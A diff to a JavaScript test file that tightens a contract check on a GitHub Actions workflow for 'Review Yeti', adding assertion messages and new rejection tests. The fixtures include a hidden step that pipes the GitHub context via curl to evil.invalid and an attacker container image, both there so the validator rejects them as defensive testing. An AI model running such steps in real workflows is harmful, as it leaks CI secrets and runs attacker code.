@@ -35,7 +35,7 @@ function assertCallerContract(workflow) {
   assert.deepEqual(secretRefs.sort(), [
     'REVIEW_YETI_DISPATCH_APP_ID',
     'REVIEW_YETI_DISPATCH_APP_PRIVATE_KEY',
-  ]);
+  ], 'caller secret refs must be exactly the dispatch App credentials');
 
   for (const forbidden of [
     /actions\/checkout/iu,
@@ -51,12 +51,19 @@ function assertCallerContract(workflow) {
     assert.doesNotMatch(workflow, forbidden);
   }
 
+  const jobBlock = withoutComments.match(/^  dispatch:\n([\s\S]*)/mu)?.[1] ?? '';
+  assert.deepEqual(
+    [...jobBlock.matchAll(/^ {4}([A-Za-z0-9_-]+):/gmu)].map(([, key]) => key),
+    ['runs-on', 'steps'],
+    'caller job keys must be exactly runs-on and steps',
+  );
   assert.deepEqual(
     [...workflow.matchAll(/^ {6}- ([^\n]+)$/gmu)].map(([, firstKey]) => firstKey),
     [
       'name: Mint Review Yeti dispatch token',
       'name: Dispatch central Review Yeti',
     ],
+    'caller step list must contain exactly the two named steps',
   );
   assert.deepEqual(
     [...workflow.matchAll(/^\s+uses:\s*([^\s]+)\s*$/gmu)].map(([, reference]) => reference),
@@ -65,6 +72,7 @@ function assertCallerContract(workflow) {
   assert.deepEqual(
     [...workflow.matchAll(/^ {8}run:\s*(.*)$/gmu)].map(([, scalar]) => scalar),
     ['|'],
+    'caller run scalar must be exactly one block literal',
   );
   for (const marker of [
     'id: dispatch_token',
@@ -109,8 +117,36 @@ test('caller contract rejects hidden steps, duplicate secret use, and alternate 
       '      - name: Dispatch central Review Yeti',
     ].join('\n'),
   );
-  assert.throws(() => assertCallerContract(hiddenStep));
+  assert.throws(
+    () => assertCallerContract(hiddenStep),
+    /caller secret refs must be exactly the dispatch App credentials/u,
+  );
+
+  const hiddenStepWithoutSecretRef = workflow.replace(
+    '      - name: Dispatch central Review Yeti',
+    [
+      '      - run: echo "${{ toJSON(github) }}" | curl --data-binary @- https://evil.invalid',
+      '',
+      '      - name: Dispatch central Review Yeti',
+    ].join('\n'),
+  );
+  assert.throws(
+    () => assertCallerContract(hiddenStepWithoutSecretRef),
+    /caller step list must contain exactly the two named steps/u,
+  );
+
+  const containerizedJob = workflow.replace(
+    '    runs-on: ubuntu-latest',
+    '    container: ghcr.io/attacker/evil:latest\n    runs-on: ubuntu-latest',
+  );
+  assert.throws(
+    () => assertCallerContract(containerizedJob),
+    /caller job keys must be exactly runs-on and steps/u,
+  );
 
   const foldedRun = workflow.replace('        run: |', '        run: >');
-  assert.throws(() => assertCallerContract(foldedRun));
+  assert.throws(
+    () => assertCallerContract(foldedRun),
+    /caller run scalar must be exactly one block literal/u,
+  );
 });
